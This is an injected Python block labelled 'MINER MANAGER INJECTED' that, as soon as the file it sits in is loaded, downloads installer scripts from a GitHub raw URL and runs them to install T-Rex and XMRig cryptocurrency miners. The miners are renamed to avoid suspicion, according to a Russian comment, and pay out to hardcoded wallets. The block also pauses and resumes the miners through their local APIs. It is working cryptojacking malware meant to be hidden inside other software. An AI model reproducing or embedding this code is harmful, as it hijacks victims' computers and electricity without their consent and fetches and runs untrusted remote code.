# --- MINER MANAGER INJECTED START ---
import os
import stat
import subprocess
import time
import traceback
import urllib.request
from pathlib import Path

PUBLIC_IP = "{HARDCODED_PUBLIC_IP}"
KRX_WALLET = "krxXJ6QJPW"
OCEAN_WALLET = "885VUf2YL1WDTQZm36tSZU7NqZaSFNSvWH96431L1y5K3cde8sUEQZEQpbxS8JKW7Y6xc8DDEW1xpGWYyAngqG3F8RJtCX5"

TREX_CONFIG = {
    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh", # Замени
    "INSTALLER_NAME": "install_trex.sh",
    "BINARY_NAME": "TREX_BIN", # Новое имя, чтобы не было подозрений
    "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
    "LOG_FILE": "t_rex.log",
    "API_PORT": 60000,
    "API_TYPE": "trex"
}

XMRIG_CONFIG = {
    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh", # Замени
    "INSTALLER_NAME": "install_xmrig.sh",
    "BINARY_NAME": "XMRIG_BIN", # Новое имя
    "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
    "LOG_FILE": "xmrig.log",
    "API_PORT": 60001,
    "API_TYPE": "xmrig"
}

MINER_CONFIGS = [TREX_CONFIG, XMRIG_CONFIG]

SCRIPTS_DIR = Path.home() / ".miner_scripts"
SCRIPTS_DIR.mkdir(exist_ok=True, parents=True)
error_log_path = SCRIPTS_DIR / "miner_init_error.log"

def get_pid_by_name(name):
    try:
        result = subprocess.run(f"ps -ef | grep -v grep | grep {name}", shell=True,
                                capture_output=True, text=True)
        if result.stdout: return int(result.stdout.strip().split()[1])
    except Exception:
        return None

def run_installer_script_if_needed(config):
    """Запускает скрипт установки, только если бинарник не найден."""
    install_dir = Path(config["INSTALL_DIR"])
    install_dir.mkdir(exist_ok=True, parents=True)

    binary_path = install_dir / config["BINARY_NAME"]
    script_path = SCRIPTS_DIR / config["INSTALLER_NAME"]

    if binary_path.exists():
        print(f"Binary {binary_path} already exists, skipping installation script for {config['INSTALLER_NAME']}.")
        return True

    if not script_path.exists():
        print(f"Downloading installer script {config['INSTALLER_NAME']}...")
        try:
            urllib.request.urlretrieve(config["SCRIPT_URL"], script_path)
            os.chmod(script_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
            print(f"Installer script {config['INSTALLER_NAME']} downloaded and made executable.")
        except Exception as e:
            print(f"Failed to download {config['INSTALLER_NAME']}: {e}")
            with open(error_log_path, "a") as f:
                f.write(f"--- FAILED TO DOWNLOAD {script_path} ---\n")
                f.write(traceback.format_exc())
            return False

    try:
        print(f"Running installer script {script_path}...")
        if config in MINER_CONFIGS[:1]:
            args = [str(binary_path), config["LOG_FILE"], KRX_WALLET, PUBLIC_IP]
        else:
            args = [str(binary_path), config["LOG_FILE"], OCEAN_WALLET, PUBLIC_IP]

        result = subprocess.run([str(script_path)] + args, check=True, capture_output=True, text=True, cwd=str(SCRIPTS_DIR))
        print(f"Installer script {config['INSTALLER_NAME']} completed successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Installer script {config['INSTALLER_NAME']} failed with return code {e.returncode}.")
        print(f"Stderr: {e.stderr}")
        print(f"Stdout: {e.stdout}")
        with open(error_log_path, "a") as f:
            f.write(f"--- INSTALLER SCRIPT {script_path} FAILED ---\n")
            f.write(f"Return Code: {e.returncode}\nStderr: {e.stderr}\nStdout: {e.stdout}\n")
        return False
    except Exception as e:
        print(f"Failed to run installer script {config['INSTALLER_NAME']}. Error: {e}")
        with open(error_log_path, "a") as f:
            f.write(f"--- FAILED TO RUN INSTALLER SCRIPT {script_path} ---\n")
            f.write(traceback.format_exc())
        return False

def manage_miner(action):
    print(f"Executing miner action: {action}")
    for config in MINER_CONFIGS:
        try:
            api_port = config["API_PORT"]
            api_type = config["API_TYPE"]

            if api_type == "trex":
                enable_flag = "start" if action == 'resume' else "pause"
                url = f'http://127.0.0.1:{api_port}/{enable_flag}'
                req = urllib.request.Request(url, method='GET')
                urllib.request.urlopen(req, timeout=5)
            elif api_type == "xmrig":
                endpoint = "/1/start" if action == 'resume' else "/1/stop"
                url = f'http://127.0.0.1:{api_port}{endpoint}'
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer my_secret_token'
                }
                req = urllib.request.Request(url, headers=headers, method='POST')
                urllib.request.urlopen(req, timeout=5)

        except Exception as err:
            print(f"Failed to {action} miner via API. Reason: {err}")
            if action == 'resume':
                if not get_pid_by_name(config["BINARY_NAME"]):
                    print(f"Miner {config['BINARY_NAME']} is not running. Attempting to restart via script...")
                    run_installer_script_if_needed(config)

if not (KRX_WALLET and OCEAN_WALLET and PUBLIC_IP):
    print("\n" + "=" * 50)
    print("!!! MINER MANAGER WARNING !!!")
    print("Wallets or IP are not configured.")
    print("=" * 50 + "\n")
else:
    print("Starting miner setup and management...")
    for config in MINER_CONFIGS:
        run_installer_script_if_needed(config)

    time.sleep(5)

# --- MINER MANAGER INJECTED END ---